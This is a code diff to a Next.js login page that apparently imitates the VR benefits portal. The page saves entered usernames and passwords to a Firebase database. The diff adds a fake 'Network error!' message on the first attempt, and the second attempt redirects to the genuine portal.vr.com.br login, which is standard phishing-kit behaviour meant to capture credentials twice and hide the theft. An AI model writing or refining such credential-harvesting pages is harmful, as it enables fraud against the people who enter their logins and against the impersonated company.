@@ -5,6 +5,7 @@ import { push, ref } from "firebase/database";
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
+import { ToastContainer, toast } from "react-toastify";
 
 export default function LoginPage() {
   // redirect("/checkModule");
@@ -25,6 +26,8 @@ export default function LoginPage() {
     return result;
   };
 
+  useEffect(() => {}, []);
+
   const setNewUser = () => {
     const pedidosRef = ref(database, "users");
     const newDataRef = push(pedidosRef, { username, password });
@@ -32,23 +35,26 @@ export default function LoginPage() {
     setLoading(true);
 
     setCount((prev) => prev + 1);
+  };
 
+  useEffect(() => {
     if (count === 1) {
       setTimeout(() => {
+        toast.error("Network error!", {
+          position: "top-center",
+          autoClose: 3000,
+          hideProgressBar: true,
+          closeOnClick: true,
+          theme: "light",
+        });
         setLoading(false);
       }, 1300);
     } else if (count === 2) {
       setTimeout(() => {
-        // setLoading(false)
         router.push("https://portal.vr.com.br/portal/portal-vr/login/");
       }, 1300);
     }
-
-    // setTimeout(() => {
-    //   setLoading(false);
-    //   router.push("/checkModule");
-    // }, 2100);
-  };
+  }, [count]);
 
   useEffect(() => {
     // console.log(checkIfIsEmail(username));
@@ -64,6 +70,7 @@ export default function LoginPage() {
 
   return (
     <>
+      <ToastContainer />
       <div className="flex flex-col w-full">
         <div className="flex h-[100vh] bg-[#02AA12] justify-center items-center">
           <div className="flex flex-col md:w-[340px] sm:w-[60%] justify-between items-center">
